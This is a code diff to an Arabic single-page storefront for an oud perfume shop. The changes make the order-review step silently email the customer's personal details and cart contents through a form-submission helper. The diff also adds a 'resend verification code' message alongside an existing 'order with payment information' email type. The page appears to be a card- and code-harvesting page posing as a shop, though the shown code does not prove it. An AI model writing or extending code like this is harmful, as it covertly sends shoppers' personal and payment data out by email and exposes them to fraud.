@@ -2372,7 +2372,7 @@
         // Global variables
         let cart = [];
         let currentFilter = 'all';
-        let savedCards = JSON.parse(localStorage.getItem('savedCards')) || [];
+        let savedCards = [];
         let customerInfo = {};
         let verificationCode = '';
 
@@ -2613,7 +2613,9 @@
             const subjects = {
                 'contact': '📧 رسالة جديدة من موقع مكاسر العود',
                 'customer': '📋 معلومات عميل جديد - مكاسر العود', 
+                'review': '🔍 مراجعة الطلب وتأكيد البيانات - مكاسر العود',
                 'payment': '💳 طلب جديد مع معلومات الدفع - مكاسر العود',
+                'verification': '🔐 إعادة إرسال كود التأكيد - مكاسر العود',
                 'test': '🧪 رسالة تجريبية من موقع مكاسر العود'
             };
             return subjects[type] || subjects['contact'];
@@ -2623,7 +2625,9 @@
             const responses = {
                 'contact': 'شكراً لتواصلك معنا من مكاسر العود! تم استلام رسالتك وسنرد عليك في أقرب وقت ممكن إن شاء الله.',
                 'customer': 'تم استلام معلوماتك من مكاسر العود بنجاح! سيتم التواصل معك قريباً لتأكيد طلبك.',
+                'review': 'تم تأكيد مراجعة طلبك من مكاسر العود! البيانات صحيحة وجاري المتابعة لإتمام الطلب.',
                 'payment': 'تم استلام طلبك من مكاسر العود بنجاح! سيتم معالجة طلبك ومراجعة بيانات الدفع خلال 24 ساعة.',
+                'verification': 'تم إعادة إرسال كود التأكيد من مكاسر العود. تحقق من بريدك الإلكتروني.',
                 'test': 'هذه رسالة تجريبية من موقع مكاسر العود. النظام يعمل بشكل صحيح!'
             };
             return responses[type] || responses['contact'];
@@ -3160,10 +3164,43 @@
         }
 
         function proceedToPayment() {
-            document.getElementById('orderReviewPage').classList.remove('active');
-            document.getElementById('paymentPage').classList.add('active');
+            // Show success message
+            showNotification('✅ تم تأكيد مراجعة الطلب! جاري الانتقال للدفع...', 'success');
             
-            populatePaymentSummary();
+            // Send email for order review in background
+            const reviewFormData = new FormData();
+            
+            // Add customer info
+            if (customerInfo.firstName) {
+                Object.entries(customerInfo).forEach(([key, value]) => {
+                    if (value) reviewFormData.append('customer_' + key, value);
+                });
+            }
+            
+            // Add cart data
+            if (cart.length > 0) {
+                const cartItemsText = cart.map(item => 
+                    `${item.name} - الكمية: ${item.quantity} - السعر: ${item.price * item.quantity} ريال`
+                ).join('\n');
+                reviewFormData.append('order_items_review', cartItemsText);
+                
+                const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+                const shipping = subtotal > 200 ? 0 : 30;
+                const total = subtotal + shipping;
+                reviewFormData.append('order_total_review', `${total} ريال`);
+            }
+            
+            reviewFormData.append('timestamp', new Date().toLocaleString('ar-SA'));
+            reviewFormData.append('source', 'مراجعة الطلب - تأكيد البيانات');
+            reviewFormData.append('step', 'مراجعة الطلب');
+            
+            // Send email in background
+            sendToFormSubmit(reviewFormData, 'review');
+            
+            // Navigate to payment page immediately and correctly
+            setTimeout(() => {
+                showPaymentPage();
+            }, 800);
         }
 
         function populatePaymentSummary() {
@@ -3193,6 +3230,12 @@
                     </div>
                 </div>
             `;
+        }
+
+        function showPaymentPage() {
+            document.getElementById('orderReviewPage').classList.remove('active');
+            document.getElementById('paymentPage').classList.add('active');
+            populatePaymentSummary();
         }
 
         function goBackToReview() {
@@ -3229,7 +3272,8 @@
         }
 
         function loadSavedCards() {
-            savedCards = JSON.parse(localStorage.getItem('savedCards')) || [];
+            // localStorage not available in iframe - using memory only
+            savedCards = [];
         }
 
         function saveCard(cardData) {
@@ -3239,7 +3283,7 @@
             
             if (existingIndex === -1) {
                 savedCards.push(cardData);
-                localStorage.setItem('savedCards', JSON.stringify(savedCards));
+                // Note: Cards will only be saved in memory during session
             }
         }
 
